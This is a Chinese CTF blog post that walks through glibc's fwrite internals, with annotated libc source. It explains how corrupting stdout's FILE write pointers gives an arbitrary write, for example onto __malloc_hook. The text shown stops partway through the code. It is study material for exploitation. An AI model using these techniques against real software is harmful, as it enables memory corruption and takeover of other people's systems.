<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="基于攻击对fwrite函数的跟踪, Matrix">
    <meta name="description" content="fwrite功能：C 库函数 size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream) 把 ptr 所指向的数组中的数据写入到给定流 stream 中。申">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>基于攻击对fwrite函数的跟踪 | Matrix</title>
    <link rel="icon" type="image/jpeg" href="/medias/matrix.jpg">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
    <style type="text/css">
        
    </style>

    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>


<body>

<header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="container">
            <div class="nav-wrapper">
                <div class="brand-logo">
                    <a href="/" class="waves-effect waves-light">
                        
                        <img src="/medias/matrix.jpg" class="logo-img hide-on-small-only">
                        
                        <span class="logo-span">Matrix</span>
                    </a>
                </div>
                

<a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right">
    
    <li class="hide-on-med-and-down">
        <a href="/" class="waves-effect waves-light">
            
            <i class="fa fa-home"></i>
            
            <span>首页</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/tags" class="waves-effect waves-light">
            
            <i class="fa fa-tags"></i>
            
            <span>标签</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/categories" class="waves-effect waves-light">
            
            <i class="fa fa-bookmark"></i>
            
            <span>分类</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/archives" class="waves-effect waves-light">
            
            <i class="fa fa-archive"></i>
            
            <span>归档</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/about" class="waves-effect waves-light">
            
            <i class="fa fa-user-circle-o"></i>
            
            <span>关于</span>
        </a>
    </li>
    
    <li>
        <a id="toggleSearch" class="waves-effect waves-light">
            <i id="searchIcon" class="mdi-action-search" title="搜索"></i>
        </a>
    </li>

</ul>

<div class="side-nav" id="mobile-nav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/matrix.jpg" class="logo-img circle responsive-img">
        
        <div class="logo-name">Matrix</div>
        <div class="logo-desc">
            
            Fight Against Your Fate!
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li>
            <a href="/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-home"></i>
                
                首页
            </a>
        </li>
        
        <li>
            <a href="/tags" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-tags"></i>
                
                标签
            </a>
        </li>
        
        <li>
            <a href="/categories" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-bookmark"></i>
                
                分类
            </a>
        </li>
        
        <li>
            <a href="/archives" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-archive"></i>
                
                归档
            </a>
        </li>
        
        <li>
            <a href="/about" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-user-circle-o"></i>
                
                关于
            </a>
        </li>
        
        
    </ul>

    <div class="social-link">


    <a href="mailto:2337463603@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fa fa-envelope-open"></i>
    </a>



    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2334763603" target="_blank" rel="noopener" class="tooltipped" data-tooltip="QQ联系我: 2334763603" data-position="top" data-delay="50">
        <i class="fa fa-qq"></i>
    </a>


</div>
</div>

            </div>
        </div>

        
    </nav>
</header>





<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <div class="description center-align post-title">
                        基于攻击对fwrite函数的跟踪
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }
</style>
<div class="row">
    <div class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/" target="_blank">
                                <span class="chip bg-color">原理学习</span>
                            </a>
                        
                            <a href="/tags/IO-FILE/" target="_blank">
                                <span class="chip bg-color">IO_FILE</span>
                            </a>
                        
                            <a href="/tags/Tcache/" target="_blank">
                                <span class="chip bg-color">Tcache</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fa fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF-PWN/" class="post-category" target="_blank">
                                CTF-PWN
                            </a>
                        
                            <a href="/categories/CTF-PWN/2020-AXB/" class="post-category" target="_blank">
                                2020-AXB
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                <div class="post-date info-break-policy">
                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2020-11-27
                </div>

                
                    
                    <div class="info-break-policy">
                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
                        3.3k
                    </div>
                    

                    
                    <div class="info-break-policy">
                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
                        15 分
                    </div>
                    
                
				
				
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h2><p>功能：<br>C 库函数 size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream) 把 ptr 所指向的数组中的数据写入到给定流 stream 中。<br>申明：由于整个操作分支众多，这里主要讲题目中最常见的那种情况：setvbuf后经过了一次printf或puts之类的输出，我要进行IO攻击的情况</p>
<pre class=" language-c"><code class="language-c">    _flags <span class="token operator">=</span> <span class="token number">0xfbad2887</span><span class="token punctuation">,</span> 
    _IO_read_ptr <span class="token operator">=</span> <span class="token number">0x7ffff7dd56a3</span><span class="token punctuation">,</span> 
    _IO_read_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd56a3</span><span class="token punctuation">,</span> 
    _IO_read_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd56a3</span><span class="token punctuation">,</span> 
    _IO_write_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd56a3</span><span class="token punctuation">,</span> 
    _IO_write_ptr <span class="token operator">=</span> <span class="token number">0x7ffff7dd56a3</span><span class="token punctuation">,</span> 
    _IO_write_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd56a3</span><span class="token punctuation">,</span> 
    _IO_buf_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd56a3</span><span class="token punctuation">,</span> 
    _IO_buf_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd56a4</span><span class="token punctuation">,</span> </code></pre>
<h2 id="libc中为-IO-fwrite"><a href="#libc中为-IO-fwrite" class="headerlink" title="libc中为_IO_fwrite"></a>libc中为_IO_fwrite</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"libioP.h"</span></span>
<span class="token macro property"># <span class="token directive keyword">define</span> _IO_vtable_offset(THIS) (THIS)->_vtable_offset</span>
_IO_size_t
<span class="token function">_IO_fwrite</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> _IO_size_t size<span class="token punctuation">,</span> _IO_size_t count<span class="token punctuation">,</span> _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _IO_size_t request <span class="token operator">=</span> size <span class="token operator">*</span> count<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//需要输出的字符串总数</span>
  _IO_size_t written <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//已经输出的量</span>
  <span class="token function">CHECK_FILE</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">_IO_acquire_lock</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">_IO_fwide</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    written <span class="token operator">=</span> <span class="token function">_IO_sputn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> buf<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_IO_release_lock</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment" spellcheck="true">/* We have written all of the input in case the return value indicates
     this or EOF is returned.  The latter is a special case where we
     simply did not manage to flush the buffer.  But the data is in the
     buffer and therefore written as far as fwrite is concerned.  */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>written <span class="token operator">==</span> request <span class="token operator">||</span> written <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> count<span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token keyword">return</span> written <span class="token operator">/</span> size<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>_IO_fwrite<span class="token punctuation">)</span></code></pre>
<p>我们需要注意的：</p>
<ul>
<li>_IO_acquire_lock (fp)加锁，应对多线程资源共享的问题</li>
<li>主要检查：<ul>
<li>_IO_vtable_offset ：检查fp的_vtable_offset成员，不能为0</li>
</ul>
</li>
<li>执行_IO_sputn 也就是<strong>_IO_new_file_xsputn</strong></li>
</ul>
<h3 id="IO-new-file-xsputn"><a href="#IO-new-file-xsputn" class="headerlink" title="_IO_new_file_xsputn"></a>_IO_new_file_xsputn</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _IO_LINE_BUF 0x200</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span>
_IO_size_t
<span class="token function">_IO_new_file_xsputn</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t n<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> data<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//用户字符串数组</span>
  _IO_size_t to_do <span class="token operator">=</span> n<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//需输出的量</span>
  <span class="token keyword">int</span> must_flush <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  _IO_size_t count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token comment" spellcheck="true">/* This is an optimized implementation.
     If the amount to be written straddles a block boundary
     (or the filebuf is unbuffered), use sys_write directly. */</span>

  <span class="token comment" spellcheck="true">/* First figure out how much space is available in the buffer. */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_LINE_BUF<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//一般的stdout flag成员不能通过判断</span>
    <span class="token punctuation">{</span>
      count <span class="token operator">=</span> f<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">;</span>
      <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
    <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_end <span class="token operator">></span> f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">/*判断是否还有输出缓冲区*/</span>
    count <span class="token operator">=</span> f<span class="token operator">-></span>_IO_write_end <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Space available. 输出缓冲区可用空间*/</span>

  <span class="token comment" spellcheck="true">/* Then fill the buffer. 还有缓冲区，则使用*/</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> to_do<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//缓冲区充足，切割需要的(to_do)</span>
        count <span class="token operator">=</span> to_do<span class="token punctuation">;</span>
     <span class="token comment" spellcheck="true">/*根据_IO_write_ptr将数据拷贝到缓冲区*/</span>
<span class="token macro property">#<span class="token directive keyword">ifdef</span> _LIBC  </span><span class="token comment" spellcheck="true">//一般是1</span>
      f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> <span class="token function">__mempcpy</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">,</span> s<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">else</span></span>
      <span class="token function">memcpy</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">,</span> s<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment" spellcheck="true">/*缓冲区切割*/</span>
      f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
      s <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">;</span>
      to_do <span class="token operator">-</span><span class="token operator">=</span> count<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//减少对应需求</span>
    <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>to_do <span class="token operator">+</span> must_flush <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//must_flush 一般为0，也就是如果需求 > 0</span>
    <span class="token punctuation">{</span>
      _IO_size_t block_size<span class="token punctuation">,</span> do_write<span class="token punctuation">;</span>
      <span class="token comment" spellcheck="true">/* Next flush the (full) buffer.执行_IO_OVERFLOW 建立或刷新缓冲区 */</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">/* If nothing else has to be written we must not signal the
           caller that everything has been written.  */</span>
        <span class="token keyword">return</span> to_do <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token constant">EOF</span> <span class="token punctuation">:</span> n <span class="token operator">-</span> to_do<span class="token punctuation">;</span>

      <span class="token comment" spellcheck="true">/* Try to maintain alignment: write a whole number of blocks.  */</span>
      block_size <span class="token operator">=</span> f<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> f<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//整个stdout buf的大小 </span>
      do_write <span class="token operator">=</span> to_do <span class="token operator">-</span> <span class="token punctuation">(</span>block_size <span class="token operator">>=</span> <span class="token number">128</span> <span class="token operator">?</span> to_do <span class="token operator">%</span> block_size <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//后面这个三目运算一般取0因为block_size大部分情况为1</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_write<span class="token punctuation">)</span> 
        <span class="token punctuation">{</span>
          count <span class="token operator">=</span> <span class="token function">new_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> s<span class="token punctuation">,</span> do_write<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//直接不通过缓冲区直接将源字符串输出，不可以用作数据泄露</span>
          to_do <span class="token operator">-</span><span class="token operator">=</span> count<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&lt;</span> do_write<span class="token punctuation">)</span>
            <span class="token keyword">return</span> n <span class="token operator">-</span> to_do<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

      <span class="token comment" spellcheck="true">/* Now write out the remainder.  Normally, this will fit in the
     buffer, but it's somewhat messier for line-buffered files,
     so we let _IO_default_xsputn handle the general case. */</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>to_do<span class="token punctuation">)</span>
    to_do <span class="token operator">-</span><span class="token operator">=</span> <span class="token function">_IO_default_xsputn</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> s<span class="token operator">+</span>do_write<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token keyword">return</span> n <span class="token operator">-</span> to_do<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_xsputn<span class="token punctuation">,</span> _IO_file_xsputn<span class="token punctuation">)</span></code></pre>
<p>这个函数之所以是众多输出函数和核心，是因为他是用来调度输出缓冲区的相关函数来处理用户各种输出需求。由于用户需求的不同以及输出缓冲区情况不同，分支众多。<br>一般过程：</p>
<ul>
<li>根据f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr判断是否还有输出缓冲区<ul>
<li>有则计算其大小count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr<ul>
<li>如果count充足(当然是对_IO_write_ptr进行覆盖后)<ul>
<li>将数据拷贝到_IO_write_ptr所指向的缓冲区，需求置零<ul>
<li>PWN！数据写入：所以只要将_IO_write_ptr和_IO_write_end完全控制，配合fwrite或fputs，puts函数就能任意地址写。当然这些输出函数必须是输出用户可控的数据</li>
<li>上面的情况比较理想，如果遇到不理想的情况，比如说只能覆盖_IO_write_ptr几个字节，那么可以选择覆盖到__malloc_hook,或者其他低地址的关键数据</li>
</ul>
</li>
</ul>
</li>
<li>count不足<ul>
<li>拷贝一定量用户数据到恰好填满缓冲区，对应的需求减少count</li>
</ul>
</li>
</ul>
</li>
<li>没有就没有喽</li>
</ul>
</li>
<li>继续：如果需求大于0(结合上面一开始的判断，和操作，应该就明白<strong>程序走到这一步就代表着：缓冲区满了或无缓冲区</strong><ul>
<li><strong>执行_IO_OVERFLOW(也就是_IO_new_file_overflow )</strong></li>
</ul>
</li>
</ul>
<p>我们就先开启一个函数分支：_IO_new_file_overflow </p>
<h4 id="IO-new-file-overflow-缓冲区满了或无缓冲区的象征"><a href="#IO-new-file-overflow-缓冲区满了或无缓冲区的象征" class="headerlink" title="_IO_new_file_overflow (缓冲区满了或无缓冲区的象征)"></a>_IO_new_file_overflow (缓冲区满了或无缓冲区的象征)</h4><pre class=" language-c"><code class="language-c"><span class="token macro property"># <span class="token directive keyword">define</span> EOF (-1)</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_NO_READS 4 </span><span class="token comment" spellcheck="true">/* Reading not allowed 标志位：不可读*/</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_NO_WRITES 8 </span><span class="token comment" spellcheck="true">/* Writing not allowd 标志位：不可写*/</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_TIED_PUT_GET 0x400 </span><span class="token comment" spellcheck="true">/* Set if put and get pointer logicly tied. */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base) </span><span class="token comment" spellcheck="true">/*IO 缓冲区的大小*/</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_in_backup(fp) ((fp)->_flags &amp; _IO_IN_BACKUP)</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_IN_BACKUP 0x100</span>
<span class="token keyword">int</span>
<span class="token function">_IO_new_file_overflow</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">int</span> ch<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_NO_WRITES<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* SET ERROR 需要bypass*/</span>   
    <span class="token punctuation">{</span>
      f<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_ERR_SEEN<span class="token punctuation">;</span>
      <span class="token function">__set_errno</span> <span class="token punctuation">(</span>EBADF<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token comment" spellcheck="true">/* If currently reading or no buffer allocated. */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> f<span class="token operator">-></span>_IO_write_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//不进入，如果进入不可能泄露地址</span>
    <span class="token punctuation">{</span>
          <span class="token comment" spellcheck="true">/* Allocate a buffer if needed. */</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>   
        <span class="token punctuation">{</span>
          <span class="token function">_IO_doallocbuf</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">_IO_setg</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span> f<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span> f<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
          <span class="token comment" spellcheck="true">/* Otherwise must be currently reading.
         If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
         logically slide the buffer forwards one block (by setting the
         read pointers to all point at the beginning of the block).  This
         makes room for subsequent output.
         Otherwise, set the read pointers to _IO_read_end (leaving that
         alone, so it can continue to correspond to the external position). */</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token function">_IO_in_backup</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//不进入</span>
        <span class="token punctuation">{</span>
          size_t nbackup <span class="token operator">=</span> f<span class="token operator">-></span>_IO_read_end <span class="token operator">-</span> f<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>
          <span class="token function">_IO_free_backup_area</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
          f<span class="token operator">-></span>_IO_read_base <span class="token operator">-</span><span class="token operator">=</span> <span class="token function">MIN</span> <span class="token punctuation">(</span>nbackup<span class="token punctuation">,</span>
                       f<span class="token operator">-></span>_IO_read_base <span class="token operator">-</span> f<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
          f<span class="token operator">-></span>_IO_read_ptr <span class="token operator">=</span> f<span class="token operator">-></span>_IO_read_base<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

          <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_read_ptr <span class="token operator">==</span> f<span class="token operator">-></span>_IO_buf_end<span class="token punctuation">)</span>
            f<span class="token operator">-></span>_IO_read_end <span class="token operator">=</span> f<span class="token operator">-></span>_IO_read_ptr <span class="token operator">=</span> f<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>
          f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> f<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>
          f<span class="token operator">-></span>_IO_write_base <span class="token operator">=</span> f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//&lt;=======</span>
          f<span class="token operator">-></span>_IO_write_end <span class="token operator">=</span> f<span class="token operator">-></span>_IO_buf_end<span class="token punctuation">;</span>
          f<span class="token operator">-></span>_IO_read_base <span class="token operator">=</span> f<span class="token operator">-></span>_IO_read_ptr <span class="token operator">=</span> f<span class="token operator">-></span>_IO_read_end<span class="token punctuation">;</span>

          f<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINE_BUF <span class="token operator">|</span> _IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span>
        f<span class="token operator">-></span>_IO_write_end <span class="token operator">=</span> f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">//&lt;=========</span>
